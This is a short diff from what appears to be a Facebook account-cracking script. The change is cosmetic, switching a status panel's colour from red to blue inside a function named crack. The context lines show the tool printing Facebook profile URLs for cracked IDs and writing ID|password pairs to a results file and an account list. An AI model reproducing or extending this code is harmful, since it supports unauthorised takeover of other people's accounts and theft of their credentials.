@@ -897,7 +897,7 @@ def crack(idf, pwv):
 𓅓 - 🇺​​​​​🇷​​​​​🇱​​​​​ : https://www.facebook.com/profile.php?id={idf}
 ━━━━━━━━━━━احمد━━━━━━━━━━━
 '''
-                    statuscp1 = nel(statuscp, style='red')
+                    statuscp1 = nel(statuscp, style='blue')
                     cetak(nel(statuscp1, title='SESI'))
                     open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                     akun.append(idf + '|' + pw)
